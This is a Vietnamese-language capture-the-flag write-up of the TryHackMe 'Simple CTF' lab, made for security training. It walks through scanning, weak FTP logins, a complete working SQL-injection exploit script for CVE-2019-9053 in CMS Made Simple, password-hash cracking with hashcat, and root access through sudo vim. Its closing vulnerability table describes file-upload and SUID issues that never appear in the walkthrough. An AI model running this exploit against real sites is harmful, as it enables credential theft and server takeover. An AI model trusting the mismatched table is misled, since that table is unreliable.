---
title: "TryHackMe - Simple CTF"
author: Thien Nguyen
date: "2026-07-03"
keywords: [THM, CTF, TryHackMe, Security, Offensive]
lang: "vi"

---


# Recon
## Nmap
```bash
└─$ sudo nmap -sC -sV -sS --reason -oA recon_nmap 10.48.131.179                                            
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-02 13:16 EDT
Nmap scan report for 10.48.131.179
Host is up, received echo-reply ttl 62 (0.15s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 62 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Cant get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.148.73
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    syn-ack ttl 62 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
2222/tcp open  ssh     syn-ack ttl 62 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.45 seconds
```

| port | service | version                                                      |
| ---- | ------- | ------------------------------------------------------------ |
| 2222 | ssh     | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) |
| 80   | http    | Apache httpd 2.4.18 ((Ubuntu))                               |
| 21     |  ftp       |       vsftpd 3.0.3                                                       |
# Enummeration
## gobuster
### dir
```bash
└─$ sudo gobuster dir -u http://10.48.131.179/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -o gobuster_directionary.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.48.131.179/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 292]
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd            (Status: 403) [Size: 297]
/index.html           (Status: 200) [Size: 11321]
/robots.txt           (Status: 200) [Size: 929]
/server-status        (Status: 403) [Size: 301]
/simple               (Status: 301) [Size: 315] [--> http://10.48.131.179/simple/]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================

```
### dns
```bash
└─$ sudo gobuster dns --domain 10.48.157.159 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o gobuster-dns.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     10.48.157.159
[+] Threads:    10
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Progress: 4989 / 4989 (100.00%)
===============================================================
Finished
===============================================================
```
## nuclei
```bash
┌──(tsukuro㉿tsukuro)-[~/…/TryHackMe/SimpleCTF/recon/nuclei]
└─$ sudo nuclei -u 10.48.157.159 -t http/cves/ -t network/ -o nuclei_report

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.6.1

                projectdiscovery.io

[INF] Current nuclei version: v3.6.1 (outdated)
[INF] Current nuclei-templates version: v10.4.5 (latest)
[INF] New templates added in latest release: 86
[INF] Templates loaded for current scan: 4356
[INF] Executing 4355 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 1 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Running httpx on input host
[INF] Found 1 URL from httpx
[INF] Templates clustered: 42 (Reduced 31 Requests)
[INF] Using Interactsh Server: oast.live
[ftp-anonymous-login] [tcp] [medium] 10.48.157.159:21
[ftp-weak-credentials] [tcp] [high] 10.48.157.159:21 [password="123456",username="ftp"]
[ftp-weak-credentials] [tcp] [high] 10.48.157.159:21 [password="guest",username="ftp"]
[ftp-weak-credentials] [tcp] [high] 10.48.157.159:21 [password="default",username="ftp"]
[ftp-weak-credentials] [tcp] [high] 10.48.157.159:21 [password="toor",username="ftp"]
[ftp-weak-credentials] [tcp] [high] 10.48.157.159:21 [password="stingray",username="ftp"]
[ftp-weak-credentials] [tcp] [high] 10.48.157.159:21 [password="nas",username="ftp"]
[ftp-weak-credentials] [tcp] [high] 10.48.157.159:21 [password="pass1",username="ftp"]
[ftp-weak-credentials] [tcp] [high] 10.48.157.159:21 [password="password",username="ftp"]
[ftp-detect] [tcp] [info] 10.48.157.159:21
[vsftpd-detect:version] [tcp] [info] 10.48.157.159:21 ["3.0.3"]
[INF] Scan completed in 2m. 11 matches found.
```
## Web Application Enumeration
- Chúng ta sẽ dựa vào danh sách dir đã liệt kê để kiểm tra từng trang để xem có surface attack nào chúng ta có thể khai thác không
- Đầu tiên là robots.txt, cung cấp cho chúng ta 1 người dùng nào đó tên mike
![](../../05-Assets/Pasted%20image%2020260703033820.png)
- index.html, là trang chủ apache default
![](../../05-Assets/Pasted%20image%2020260703033846.png)
- simple, đây là trang được chuyển hướng và đưa chúng ta đến 1 trang default của CMS Made Simple(là một hệ thống quản lý nội dung mã nguồn mở). Đây là 1 surface mới nên chúng ta sẽ recon thêm từ đây
![](../../05-Assets/Pasted%20image%2020260703034215.png)
### gobuster
```bash
└─$ sudo gobuster dir -u http://10.48.157.159/simple -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster_directionary_simple_dir.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.48.157.159/simple
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 321] [--> http://10.48.157.159/simple/admin/]
/modules              (Status: 301) [Size: 323] [--> http://10.48.157.159/simple/modules/]
/tmp                  (Status: 301) [Size: 319] [--> http://10.48.157.159/simple/tmp/]
/lib                  (Status: 301) [Size: 319] [--> http://10.48.157.159/simple/lib/]
/uploads              (Status: 301) [Size: 323] [--> http://10.48.157.159/simple/uploads/]
/assets               (Status: 301) [Size: 322] [--> http://10.48.157.159/simple/assets/]
/doc                  (Status: 301) [Size: 319] [--> http://10.48.157.159/simple/doc/]
Progress: 29999 / 29999 (100.00%)
===============================================================
Finished
```
- Chúng ta cũng xác định được phiên bản của open source này là 2.2.8 giờ thì sẽ thử đi tìm CVE của nó
![](../../05-Assets/Pasted%20image%2020260703040555.png)
- Đây là CVE khi tìm kiếm bằng nvd database
![](../../05-Assets/Pasted%20image%2020260703052724.png)
- Tìm kiếm exploit script bằng searchsploit
![](../../05-Assets/Pasted%20image%2020260703052606.png)
- Giờ tiến hành exploit
# Exploitation  
- Trước tiên thì chúng ta thấy có service ftp và nuclei cũng cung cấp cho chúng ta lỗ hỏng weak credential của ftp nên chúng ta sẽ thử đăng nhập ftp vào ftp nếu thành công thì sẽ cho phép chúng ta upload file reverse shell
![](../../05-Assets/Pasted%20image%2020260703030532.png)
- Đã đăng nhập thành công giờ chúng ta sẽ thử ls để liệt kê xem có file nào ở đây không
![](../../05-Assets/Pasted%20image%2020260703034230.png)
- Liệt kê thành công giờ chúng ta sẽ lấy file trong folder này về để xem ở bên máy attacker
![](../../05-Assets/Pasted%20image%2020260703035157.png)
- Giờ thì chúng ta biết password yếu và chúng ta có thể brute force nó nhưng cần tìm nơi nào là nơi chèn mật khẩu vào để brute force và người dùng đó có thể là mitch
- Quay lại bên ftp chúng ta cũng nhận thấy vấn đề là đã bị lock trong folder pub này và không thể qua bên nào khác nữa dẫn tới việc không thể thực thi shell chúng ta upload lên, vì vậy cần tìm một vector khác để tấn công
![](../../05-Assets/Pasted%20image%2020260703035114.png)
- Quay lại với file exploit chúng ta đã enum ở giai đoạn trên giờ chúng ta sẽ sử dụng nó
![](../../05-Assets/Pasted%20image%2020260703054733.png)
- Ở khúc này mình đã thử nhiều cách và đã tải đầy đủ thư viện nhưng dường như không thể crack nó và chưa kể file exploit này được viết python2 khá may là mình kiếm được 1 file exploit tương tự được đăng trên nvd
- Link file: https://github.com/Perseus99999/CVE-2019-9053-working-/blob/main/exploit.py
- Code exploit:
```python
#!/usr/bin/env python
# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
# Date: 16-11-2025
# Exploit Author: Daniele Scanu @ Certimeter Group
# Updated by: Shubham P
# Vendor Homepage: https://www.cmsmadesimple.org/
# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
# Version: <= 2.2.9
# Tested on: Kali 6.10.11
# CVE : CVE-2019-9053 (46635)
#Updated the script to work with latest python versions, especially print()
#Added Exception Handling for each function
#You can also calibrate time.sleep inside the exception handling blocks depending on response and connection timeout errors

import requests
from requests.exceptions import ConnectionError
from termcolor import colored
import time
from termcolor import cprint
import optparse
import hashlib

parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Base target uri (ex. http://10.10.10.100/cms)")
parser.add_option('-w', '--wordlist', action="store", dest="wordlist", help="Wordlist for crack admin password")
parser.add_option('-c', '--crack', action="store_true", dest="cracking", help="Crack password with wordlist", default=False)

options, args = parser.parse_args()
if not options.url:
    print ("[+] Specify an url target")
    print ("[+] Example usage (no cracking password): exploit.py -u http://target-uri")
    print ("[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist")
    print ("[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.")
    exit()

url_vuln = options.url + '/moduleinterface.php?mact=News,m1_,default,0'
session = requests.Session()
dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
flag = True
password = ""
temp_password = ""
TIME = 2 #Change this depending on output accuracy. 1-3 is the sweet spot in my experience
db_name = ""
output = ""
email = ""

salt = ''
wordlist = ""
if options.wordlist:
    wordlist += options.wordlist

def crack_password():
    global password
    global output
    global wordlist
    global salt
    dict = open(wordlist,"r",encoding="latin-1")
    for line in dict.readlines():
        line = line.rstrip("\r\n") #strip newline
        beautify_print_try(line)
        if hashlib.md5((salt + line).encode("latin-1")).hexdigest() == password:
            output += "\n[+] Password cracked: " + line
            break
        
    dict.close()

def beautify_print_try(value):
    global output
    print ("\033c")
    cprint(output,'green', attrs=['bold'])
    cprint('[*] Try: ' + value, 'red', attrs=['bold'])

def beautify_print():
    global output
    print ("\033c")
    cprint(output,'green', attrs=['bold'])

def dump_salt():
    global flag
    global salt
    global output
    ord_salt = ""
    ord_salt_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_salt = salt + dictionary[i]
            ord_salt_temp = ord_salt + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_salt)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_siteprefs+where+sitepref_value+like+0x" + ord_salt_temp + "25+and+sitepref_name+like+0x736974656d61736b)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            try:
            	r = session.get(url,timeout=15) #Calibrate it according to your network latency
            except Exception as e:
            	print(f"[!] Connection error: {e}. Retrying...")
            	#time.sleep(1)
            	continue
            
            	
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
            #time.sleep(0.1)
        if flag:
            salt = temp_salt
            ord_salt = ord_salt_temp
    flag = True
    output += '\n[+] Salt for password found: ' + salt

def dump_password():
    global flag
    global password
    global output
    ord_password = ""
    ord_password_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_password = password + dictionary[i]
            ord_password_temp = ord_password + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_password)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users"
            payload += "+where+password+like+0x" + ord_password_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            
            try:
            	r = session.get(url,timeout=15)#Calibrate it according to your network latency
            except Exception as e:
            	print(f"[!] Connection error: {e}. Retrying...")
            	#time.sleep(1)
            	continue
            
            	
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
            #time.sleep(0.1)           
        if flag:
            password = temp_password
            ord_password = ord_password_temp
    flag = True
    output += '\n[+] Password found: ' + password

def dump_username():
    global flag
    global db_name
    global output
    ord_db_name = ""
    ord_db_name_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_db_name = db_name + dictionary[i]
            ord_db_name_temp = ord_db_name + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_db_name)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+username+like+0x" + ord_db_name_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
           
            try:
            	r = session.get(url,timeout=10)#Added Exception Handling.Calibrate it according to your network latency
            except Exception as e:
            	print(f"[!] Connection error: {e}. Retrying...")
            	#time.sleep(1)
            	continue
            
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
            #time.sleep(0.1)   
        if flag:
            db_name = temp_db_name
            ord_db_name = ord_db_name_temp
    output += '\n[+] Username found: ' + db_name
    flag = True

def dump_email():
    global flag
    global email
    global output
    ord_email = ""
    ord_email_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_email = email + dictionary[i]
            ord_email_temp = ord_email + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_email)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+email+like+0x" + ord_email_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            try:
            	r = session.get(url,timeout=10)#Added Exception Handling
            except Exception as e:
            	print(f"[!] Connection error: {e}. Retrying...")
            	#time.sleep(1)
            	continue
                        	
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
            #time.sleep(0.1)    
        if flag:
            email = temp_email
            ord_email = ord_email_temp
    output += '\n[+] Email found: ' + email
    flag = True

dump_salt()
dump_username()
dump_email()
dump_password()

if options.cracking:
    print (colored("[*] Now try to crack password"))
    crack_password()

beautify_print()
```
- Kết quả sau khi chạy chúng ta có salt, password và username
![](../../05-Assets/Pasted%20image%2020260703055905.png)
- Bây giờ crack hash password hashcat, trước tiên phải nhận dạng đây là hash loại gì
![](../../05-Assets/Pasted%20image%2020260703060334.png)
- Có khá nhiều mode mình sẽ thử mode 10 trước tiên 
```bash
─$ hashcat -m 10 -a 0 -O -o password_cracked 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/seclists/Passwords/Common-Credentials/best110.txt 
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 5 5600H with Radeon Graphics, 2930/5861 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 51

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Precompute-Init
* Meet-In-The-Middle
* Early-Skip
* Not-Iterated
* Appended-Salt
* Single-Hash
* Single-Salt
* Raw-Hash

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (3446 MB free)

Dictionary cache built:
* Filename..: /usr/share/seclists/Passwords/Common-Credentials/best110.txt
* Passwords.: 110
* Bytes.....: 849
* Keyspace..: 110
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Hashcat is expecting at least 8192 base words but only got 1.3% of that.
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 10 (md5($pass.$salt))
Hash.Target......: 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2
Time.Started.....: Thu Jul  2 19:08:40 2026 (0 secs)
Time.Estimated...: Thu Jul  2 19:08:40 2026 (0 secs)
Kernel.Feature...: Optimized Kernel (password length 0-31 bytes)
Guess.Base.......: File (/usr/share/seclists/Passwords/Common-Credentials/best110.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:      824 H/s (0.07ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 110/110 (100.00%)
Rejected.........: 0/110 (0.00%)
Restore.Point....: 110/110 (100.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 000000 -> zxczxc
Hardware.Mon.#01.: Util: 14%

Started: Thu Jul  2 19:07:08 2026
Stopped: Thu Jul  2 19:08:42 2026
```
- Mode 10 không hiệu quả giờ chúng ta đổi qua mode 20 vì có thể password đã được salt trước khi hash
```
└─$ hashcat -m 20 -a 0 -O -o password_cracked 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/seclists/Passwords/Common-Credentials/best110.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 5 5600H with Radeon Graphics, 2930/5861 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 51

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Precompute-Init
* Early-Skip
* Not-Iterated
* Prepended-Salt
* Single-Hash
* Single-Salt
* Raw-Hash
* Register-Limit

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (3428 MB free)

Dictionary cache hit:
* Filename..: /usr/share/seclists/Passwords/Common-Credentials/best110.txt
* Passwords.: 110
* Bytes.....: 849
* Keyspace..: 110

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Hashcat is expecting at least 8192 base words but only got 1.3% of that.
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 20 (md5($salt.$pass))
Hash.Target......: 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2
Time.Started.....: Thu Jul  2 19:11:20 2026 (0 secs)
Time.Estimated...: Thu Jul  2 19:11:20 2026 (0 secs)
Kernel.Feature...: Optimized Kernel (password length 0-31 bytes)
Guess.Base.......: File (/usr/share/seclists/Passwords/Common-Credentials/best110.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:    33913 H/s (0.06ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 110/110 (100.00%)
Rejected.........: 0/110 (0.00%)
Restore.Point....: 0/110 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 000000 -> zxczxc
Hardware.Mon.#01.: Util: 14%

Started: Thu Jul  2 19:10:37 2026
Stopped: Thu Jul  2 19:11:22 2026
```
![](../../05-Assets/Pasted%20image%2020260703061418.png)
- Crack thành công giờ chúng ta sẽ ssh vào target
![](../../05-Assets/Pasted%20image%2020260703061846.png)
- Đã xong lưu ý password là `secret` chứ không phải phần salt ở trước nó, giờ chúng ta sẽ leo thang lên root
- Trước thì lấy flag của user:
![](../../05-Assets/Pasted%20image%2020260703062047.png)
- Dùng `sudo -l` để check quyền của user hiện tại
![](../../05-Assets/Pasted%20image%2020260703062316.png)
- Từ ảnh trên ta suy ra user hiện tại có thể chạy vim bằng sudo mà không cần mật khẩu lúc này chúng ta sẽ lợi dụng vim để leo thang đặc quyền
![](../../05-Assets/Pasted%20image%2020260703062945.png)
- Chạy `:!/bin/bash` trong vim
![](../../05-Assets/Pasted%20image%2020260703063130.png)
- Xong chúng ta có quyền root giờ thì lấy flag của root nữa thôi
![](../../05-Assets/Pasted%20image%2020260703063223.png)

# Security Issues Identified

| Vulnerability                        | Severity   | Impact |
|--------------------------------------|------------|--------|
| Unrestricted File Upload (Extension Bypass) | **Critical** | Cho phép attacker upload Web Shell (.php5) dẫn đến **Remote Code Execution (RCE)** và chiếm quyền điều khiển server |
| Insecure File Upload Handling        | High       | Không kiểm tra loại file và extension chặt chẽ, cho phép thực thi mã PHP nguy hiểm |
| Abusing SUID Binary (`python2.7`)    | High       | Cho phép user thấp (`www-data`) leo thang đặc quyền lên **root** |
| Information Disclosure               | Medium     | Có thể leak thông tin (ví dụ: đường dẫn, phiên bản phần mềm) qua các trang web |


# Conclusion


# References
